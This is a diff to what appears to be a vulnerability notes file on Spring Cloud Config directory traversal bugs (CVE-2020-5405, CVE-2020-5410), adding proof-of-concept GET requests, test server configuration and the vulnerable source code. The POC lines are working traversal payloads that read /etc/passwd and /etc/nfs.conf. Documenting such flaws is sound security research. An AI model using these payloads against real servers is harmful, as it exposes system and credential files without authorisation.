@@ -565,6 +565,25 @@ POC:
 ```
 GET /a/b/test/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
 ```
+Conf:
+```
+info:
+  component: Config Server
+spring:
+  application:
+    name: configserver
+  autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
+  jmx:
+    default_domain: cloud.config.server
+  cloud:
+    config:
+      server:
+        git:
+          uri: https://github.com/spring-cloud-samples/config-repo
+          repos:
+            - patterns: multi-repo-demo-*
+              uri: https://github.com/spring-cloud-samples/config-repo
+```
 Factor: 
 ```
 org.springframework.cloud.config.server.resource.ResourceController
@@ -603,5 +622,69 @@ Affected Version: < 2.2.2 or 2.1.7
 Diff: https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0   
 POC:
 ```
+GET /1/1/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29etc/nfs.conf
 ```
+Conf:
+```
+info:
+  component: Config Server
+spring:
+  application:
+    name: configserver
+  autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
+  jmx:
+    default_domain: cloud.config.server
+  profiles:
+    active: native
+  cloud:
+    config:
+      server:
+        native:
+          search-locations:
+            - file:///Users/xxx/Downloads/environment/Spring/spring-cloud-config-2.2.1.RELEASE_cve_2020_5405/spring-cloud-config-server/config
+```
+Factor:
+```
+org.springframework.cloud.config.server.resource.ResourceController
+@RequestMapping("/{name}/{profile}/{label}/**")
+public String retrieve(...){
+    String path = getFilePath(request, name, profile, label);  // -> decodeAndCleanUriString()
+    return retrieve(name, profile, label, path, resolvePlaceholders); // -> findOne()
+}
+
+synchronized String retrieve(ServletWebRequest request, String name, String profile, String label, String path, boolean resolvePlaceholders) throws IOException {
+    name = resolveName(name);
+    label = resolveLabel(label); // -> replace (_) -> /
+    Resource resource = this.resourceRepository.findOne(name, profile, label, path);
+    ...
+}
+
+private String resolveLabel(String label) {
+    if (label != null && label.contains("(_)")) {
+        label = label.replace("(_)", "/");
+    }
+    return label;
+}
+```
+
+### CVE-2020-5410 Directory Traversal
+Affected Version: < 2.2.2 or 2.1.7 
+Diff: https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c   
+POC:
+```
+GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/222/11
+```
+Factor:
+```
+public Environment getEnvironment(String name, String profiles, String label, boolean includeOrigin) {
+    name = Environment.normalize(name);
+    label = Environment.normalize(label);
+    Environment environment = this.repository.findOne(name, profiles, label, includeOrigin);
+    ...
+}
+public static String normalize(String s) {
+    return s != null && s.contains("(_)") ? s.replace("(_)", "/") : s;
+}
+```
+
 
